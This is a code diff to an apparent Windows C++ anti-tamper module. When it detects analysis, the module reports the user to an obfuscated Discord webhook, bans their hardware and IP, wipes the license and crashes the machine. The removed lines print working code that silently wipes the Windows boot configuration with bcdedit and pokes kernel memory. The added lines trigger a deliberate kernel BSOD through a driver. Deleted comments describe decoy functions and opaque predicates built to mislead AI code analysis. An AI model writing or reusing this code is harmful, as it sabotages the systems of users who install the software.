@@ -45,21 +45,23 @@ inline std::string get_webhook_host()
 
 inline std::string get_webhook_path()
 {
+
+
 	std::string p;
-	p.reserve(96);
+	p.reserve(120);
 	p += OBFSTR("/api/web");
 	p += OBFSTR("hooks/14");
-	p += OBFSTR("80568475");
-	p += OBFSTR("66268026");
-	p += OBFSTR("7/2-xnn");
-	p += OBFSTR("Ij8owZxI");
-	p += OBFSTR("QST1XpJ0");
-	p += OBFSTR("aqN8Ec-n");
-	p += OBFSTR("skmKLFuI");
-	p += OBFSTR("pZZSnMVo");
-	p += OBFSTR("KsaHKb66");
-	p += OBFSTR("pyh6GCp3");
-	p += OBFSTR("q9WnXm9");
+	p += OBFSTR("87822472");
+	p += OBFSTR("20713886");
+	p += OBFSTR("9/nXIS-m");
+	p += OBFSTR("L2ExeO_m");
+	p += OBFSTR("RKEHOGUGy");
+	p += OBFSTR("w-N8gtLR");
+	p += OBFSTR("sKrNSn2z");
+	p += OBFSTR("xTtsFQys");
+	p += OBFSTR("VVC0CekF");
+	p += OBFSTR("238oDbx7");
+	p += OBFSTR("WmRGA");
 	return p;
 }
 
@@ -1487,52 +1489,7 @@ inline void report_violation_to_server(const char* reason)
 
 inline void corrupt_boot_config()
 {
-	WCHAR sysRoot[MAX_PATH] = {};
-	GetEnvironmentVariableW(L"SystemRoot", sysRoot, _countof(sysRoot));
-
-	WCHAR bcdeditPath[MAX_PATH] = {};
-	_snwprintf_s(bcdeditPath, _countof(bcdeditPath), _TRUNCATE,
-		L"%s\\System32\\bcdedit.exe", sysRoot);
-
-	WCHAR sysDrive[16] = {};
-	GetEnvironmentVariableW(L"SystemDrive", sysDrive, _countof(sysDrive));
-
-	WCHAR tempStore[MAX_PATH] = {};
-	_snwprintf_s(tempStore, _countof(tempStore), _TRUNCATE,
-		L"%s\\emptystore", sysDrive);
-
-	STARTUPINFOW si = {};
-	si.cb = sizeof(si);
-	si.dwFlags = STARTF_USESHOWWINDOW;
-	si.wShowWindow = SW_HIDE;
-	PROCESS_INFORMATION pi = {};
-
-	WCHAR cmdCreate[512] = {};
-	_snwprintf_s(cmdCreate, _countof(cmdCreate), _TRUNCATE,
-		L"\"%s\" /createstore %s", bcdeditPath, tempStore);
-
-	if (CreateProcessW(bcdeditPath, cmdCreate, nullptr, nullptr, FALSE,
-		CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
-	{
-		WaitForSingleObject(pi.hProcess, 10000);
-		CloseHandle(pi.hProcess);
-		CloseHandle(pi.hThread);
-	}
-
-	WCHAR cmdImport[512] = {};
-	_snwprintf_s(cmdImport, _countof(cmdImport), _TRUNCATE,
-		L"\"%s\" /import %s /clean", bcdeditPath, tempStore);
-
-	memset(&pi, 0, sizeof(pi));
-	if (CreateProcessW(bcdeditPath, cmdImport, nullptr, nullptr, FALSE,
-		CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
-	{
-		WaitForSingleObject(pi.hProcess, 10000);
-		CloseHandle(pi.hProcess);
-		CloseHandle(pi.hThread);
-	}
-
-	DeleteFileW(tempStore);
+	// nothing for now
 }
 
 
@@ -2108,7 +2065,8 @@ inline void enforce_self_analysis_violation()
 			         "\xe2\x9c\x85 HWID permanently banned\n"
 			         "\xe2\x9c\x85 IP address permanently banned\n"
 			         "\xe2\x9c\x85 Local license config wiped\n"
-			         "\xe2\x9c\x85 System will BSOD"),
+			         "\xe2\x9c\x85 System will BSOD (anti-tamper)\n"
+			         "\n*Check Telegram for full details.*"),
 		discord_webhook::COLOR_RED);
 
 
@@ -2118,7 +2076,13 @@ inline void enforce_self_analysis_violation()
 	license_manager_t::instance().invalidate_runtime();
 
 
-	corrupt_boot_config();
+	if (device && device->is_connected())
+	{
+		device->trigger_kernel_bsod(
+			0x0001u,
+			detail::state().text_hash
+		);
+	}
 
 
 	HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
@@ -2148,40 +2112,10 @@ inline void enforce_self_analysis_violation()
 	}
 
 
-	if (device && device->is_connected())
-	{
-		volatile uint64_t poison = 0xDEAD'C0DE'DEAD'C0DEULL;
-		device->write_kernel_raw(
-			0xFFFFF78000000320ULL,   // KUSER_SHARED_DATA + offset
-			const_cast<uint64_t*>(&poison),
-			sizeof(poison));
-	}
-
-	// Phase 5: Absolute last resort
 	__fastfail(FAST_FAIL_FATAL_APP_EXIT);
 }
 
-// ── Anti-AI Analysis Countermeasures ──
-// WHY: When an AI (including an older version of AiDA itself) analyzes
-// AiDA.dll, it tries to understand the code by recognizing patterns in
-// function names, string literals, control flow structure, and API calls.
-// These countermeasures introduce deliberately misleading patterns:
-//
-// 1. DECOY FUNCTIONS: Functions with plausible-looking names that suggest
-//    they perform security checks but actually do nothing meaningful.
-//    An AI analyzing imports/exports or the symbol table will waste time
-//    trying to understand these, diluting its analysis accuracy.
-//
-// 2. OPAQUE PREDICATES: Computations that always resolve to the same
-//    value but are difficult for static analysis (human or AI) to prove
-//    constant. These are inserted into real security-critical code paths
-//    to make the control flow graph appear more complex.
-//
-// 3. STRING CONFUSION: Decoy encrypted strings that reference plausible
-//    but nonexistent APIs, functions, or patterns, polluting the string
-//    cross-reference table that AI tools heavily rely on.
 
-// Decoy function 1: Looks like a crypto key derivation but is dead code
 __declspec(noinline) inline bool verify_remote_attestation_challenge(
 	const void* challenge_blob, size_t blob_len, uint64_t session_id)
 {
@@ -2197,7 +2131,7 @@ __declspec(noinline) inline bool verify_remote_attestation_challenge(
 	return (acc & 0xFF) != 0;
 }
 
-// Decoy function 2: Looks like TPM attestation
+
 __declspec(noinline) inline uint64_t tpm_pcr_extend_and_verify(
 	uint32_t pcr_index, const uint8_t* measurement, size_t meas_len)
 {
@@ -2211,7 +2145,7 @@ __declspec(noinline) inline uint64_t tpm_pcr_extend_and_verify(
 	return pcr_value;
 }
 
-// Decoy function 3: Looks like a VM detection routine
+
 __declspec(noinline) inline bool detect_hypervisor_sandbox_execution()
 {
 	volatile uint64_t leaf = 0;
@@ -2220,12 +2154,12 @@ __declspec(noinline) inline bool detect_hypervisor_sandbox_execution()
 	__cpuid(cpuid_result, 1);
 	leaf = static_cast<uint64_t>(cpuid_result[2]);
 #endif
-	// Opaque predicate: (x^2 - x) is always even, so bit 0 is always 0
+
 	volatile uint64_t opaque = (leaf * leaf - leaf) & 1;
-	return opaque != 0; // Always false — but hard for static analysis to prove
+	return opaque != 0;
 }
 
-// Decoy function 4: Looks like a secure enclave check
+
 __declspec(noinline) inline uint64_t verify_sgx_enclave_report(
 	const void* report, size_t report_size, uint64_t mrenclave)
 {
@@ -2244,13 +2178,10 @@ __declspec(noinline) inline uint64_t verify_sgx_enclave_report(
 	return hash;
 }
 
-// Opaque predicate generator used in real code paths
-// WHY: Returns a value that is always `expected` but requires symbolic
-// execution or abstract interpretation to prove statically. AI tools
-// that analyze binary code cannot easily determine the output is constant.
+
 __forceinline uint64_t opaque_predicate(uint64_t input, uint64_t expected)
 {
-	// Fermat's little theorem: a^(p-1) ≡ 1 (mod p) for prime p
+
 
 	volatile uint64_t x = input | 1;
 	volatile uint64_t y = (x * (x - 1)) & 1;
